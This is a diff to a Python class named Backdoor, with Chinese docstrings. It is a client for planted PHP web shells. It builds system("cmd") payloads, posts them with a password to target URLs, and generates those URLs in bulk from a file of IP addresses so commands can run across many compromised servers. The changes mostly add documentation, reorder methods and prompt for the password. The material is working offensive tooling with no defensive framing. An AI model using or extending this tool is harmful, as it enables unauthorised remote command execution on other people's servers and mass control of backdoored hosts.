@@ -2,6 +2,7 @@ import requests
 import re
 from urllib.parse import urlparse, parse_qs, urlunparse
 from requests.exceptions import RequestException
+import warnings
 
 
 class Backdoor:
@@ -20,7 +21,27 @@ class Backdoor:
     all_Url = []  # 用于保存全部的Url
     post_data = {}  # post数据
 
-    def printAll(self):
+    def printALL(self):
+        """
+        打印所有信息。
+
+        该方法用于打印对象的所有属性、从文件中读取的IP地址和生成的URL列表。
+
+        Args:
+            None
+
+        Returns:
+            None
+
+        Example:
+            示例用法:
+            - 调用 `printALL()` 方法来打印对象的所有信息。
+        """
+        self.printALLAttribute()
+        self.printALL_IP()
+        self.printALL_Url()
+
+    def printALLAttribute(self):
         """
         打印对象的所有属性信息。
 
@@ -50,12 +71,46 @@ class Backdoor:
         print('----------------------------------------------')
 
     def printALL_IP(self):
+        """
+        打印所有从文件中读取的IP地址。
+
+        该方法用于逐行打印从文件中读取的IP地址列表。
+
+        Args:
+            None
+
+        Returns:
+            None
+
+        Example:
+            示例用法:
+            - 调用 `printALL_IP()` 方法来打印所有IP地址。
+        """
+        print("--------------------全部IP--------------------")
         for ip in self.all_IP:
             print(ip)
+        print("----------------------------------------------")
 
     def printALL_Url(self):
+        """
+        打印所有生成的URL。
+
+        该方法用于逐行打印生成的URL列表。
+
+        Args:
+            None
+
+        Returns:
+            None
+
+        Example:
+            示例用法:
+            - 调用 `printALL_Url()` 方法来打印所有生成的URL。
+        """
+        print("-------------------全部URL--------------------")
         for url in self.all_Url:
             print(url)
+        print("----------------------------------------------")
 
     def setCodeCmd(self, value=""):
         """
@@ -129,71 +184,47 @@ class Backdoor:
         """
         self.systemCmd = rf'system("{cmd}");'
 
-    def setnetloc(self, netloc):
-        try:
-            self.netloc = netloc
-        except Exception as e:
-            print("IP设置错误:", str(e))
-
-    def testUrl(self, Url="", password="admin", cmd="ls -al", automatic="y", timeoutvalue=2):
+    def setUrl(self, Url):
         """
-        测试URL连接并验证密码。
+        设置URL。
 
-        这个方法用于测试给定的URL连接是否有效，并验证密码是否正确。如果连接成功且密码正确，将保存该URL为模板。
+        该方法用于设置对象的 URL 属性。
 
         Args:
-            Url (str, optional): 要测试的URL。默认为空字符串。
-            password (str, optional): 验证密码。默认为 "admin"。
-            cmd (str, optional): 执行命令。默认为 "ls -al"。
-            automatic (str, optional): 是否自动执行测试。默认为 "y" 自动。
-            timeoutvalue (int, optional): 连接超时时间（秒）。默认为 2 秒。
+            Url (str): 要设置的 URL 字符串。
+
+        Returns:
+            None
+
+        Example:
+            示例用法:
+            - 调用 `setUrl(Url)` 方法来设置对象的 URL 属性。
+        """
+        self.Url = Url
+
+    def setnetloc(self, netloc):
+        """
+        设置域名部分。
+
+        该方法用于设置对象的域名部分（netloc）属性。
+
+        Args:
+            netloc (str): 要设置的域名部分字符串。
 
         Returns:
             None
 
         Raises:
-            RequestException: 如果请求过程中发生错误，将引发此异常。
+            Exception: 如果发生任何异常，将引发 "IP设置错误" 异常。
 
         Example:
             示例用法:
-            - 调用 `testUrl()` 方法来测试连接，并提供要测试的URL和密码。
-            - 如果连接成功且密码正确，将保存该URL为模板。
-            - 您可以使用不同的参数值来自定义测试行为，例如手动检测、更长的超时时间等。
+            - 调用 `setnetloc(netloc)` 方法来设置对象的域名部分属性。
         """
-        self.setSystemCmd(cmd)
-        self.setPassword(password)
-        self.setCodeCmd(self.systemCmd)
-        self.post_data = self.setPostValue()
         try:
-            if Url == "":
-                self.Url = re.sub(r"\"", "", input("请输入链接： "))
-            else:
-                self.Url = Url
-
-            # 发送HTTP请求，设置连接超时为2秒
-            response = requests.post(
-                self.Url, data=self.post_data, timeout=timeoutvalue)
-
-            # 检查响应状态码
-            if response.status_code != 200:
-                print("连接失败")
-            print('---------------------响应---------------------')
-            print(response.text)
-            print('----------------------------------------------')
-            if not response.text:
-                print("密码错误")
-            if '..' in response.text:
-                # 自动检测时响应中包含 ".."则代表成功,否则命令执行失败
-                print("连接成功")
-            else:
-                print("自行检查是否成功")
-
-        # 错误响应
-        except RequestException as e:
-            if "timeout" in str(e):
-                print("连接失败: 失败原因连接时间过长")
-            else:
-                print("连接失败:", str(e))
+            self.netloc = netloc
+        except Exception as e:
+            print("IP设置错误:", str(e))
 
     def analyzeUrl(self):
         """
@@ -258,10 +289,105 @@ class Backdoor:
             print("文件地址获取发生错误", str(e))
 
     def readAll_IP(self):
+        """
+        从文件中读取所有IP地址。
+
+        该方法用于从指定文件中读取所有IP地址，将它们存储在对象的属性 self.all_IP 中。
+
+        Args:
+            None
+
+        Returns:
+            None
+
+        Example:
+            示例用法:
+            - 调用 `readAll_IP()` 方法来读取文件中的IP地址并存储在对象中。
+        """
         with open(self.FileAddress, mode="r", encoding="utf-8") as f:
             self.all_IP = [line.strip() for line in f.readlines()]
 
     def spliceUrl(self):
+        """
+        根据IP地址生成URL列表。
+
+        该方法使用对象的属性（协议、路径、查询参数等）以及从文件中读取的IP地址，生成URL列表并存储在对象的属性 self.all_Url 中。
+
+        Args:
+            None
+
+        Returns:
+            None
+
+        Example:
+            示例用法:
+            - 调用 `spliceUrl()` 方法来生成URL列表并存储在对象中。
+        """
         urls = [
-            f"{self.scheme}://{ip}{self.path}?{self.query}"for ip in self.all_IP]
+            f"{self.scheme}://{ip}{self.path}?{self.query}" for ip in self.all_IP]
         self.all_Url = urls
+
+    def testUrl(self, Url="", password="", cmd="ls -al", timeoutvalue=2):
+        """
+        测试URL连接并验证密码。
+
+        这个方法用于测试给定的URL连接是否有效，并验证密码是否正确。如果连接成功且密码正确，将保存该URL为模板。
+
+        Args:
+            Url (str, optional): 要测试的URL。默认为空字符串。
+            password (str, optional): 验证密码。为空时将被要求输入密码。
+            cmd (str, optional): 执行命令。默认为 "ls -al"。
+            timeoutvalue (int, optional): 连接超时时间（秒）。默认为 2 秒。
+
+        Returns:
+            None
+
+        Raises:
+            RequestException: 如果请求过程中发生错误，将引发此异常。
+
+        Example:
+            示例用法:
+            - 调用 `testUrl()` 方法来测试连接，并提供要测试的URL和密码。
+            - 如果连接成功且密码正确，将保存该URL为模板。
+            - 您可以使用不同的参数值来自定义测试行为，例如手动检测、更长的超时时间等。
+        """
+        if cmd == "":
+            warnings.warn("未提供命令，将继续执行但可能会导致不期望的结果", Warning)
+        self.setSystemCmd(cmd)
+        try:
+            if password == '':
+                self.password = input("请输入连接密码：")
+        except:
+            print("错误的输入！")
+        self.setCodeCmd(self.systemCmd)
+        self.post_data = self.setPostValue()
+        try:
+            if Url == "":
+                self.Url = re.sub(r"\"", "", input("请输入链接： "))
+            else:
+                self.Url = Url
+
+            # 发送HTTP请求，设置连接超时为2秒
+            response = requests.post(
+                self.Url, data=self.post_data, timeout=timeoutvalue)
+
+            # 检查响应状态码
+            if response.status_code != 200:
+                print("连接失败")
+            print('---------------------响应---------------------')
+            print(response.text)
+            print('----------------------------------------------')
+            if not response.text:
+                print("密码错误")
+            if '..' in response.text:
+                # 自动检测时响应中包含 ".."则代表成功,否则命令执行失败
+                print("连接成功")
+            else:
+                print("自行检查是否成功")
+
+        # 错误响应
+        except RequestException as e:
+            if "timeout" in str(e):
+                print("连接失败: 失败原因连接时间过长")
+            else:
+                print("连接失败:", str(e))
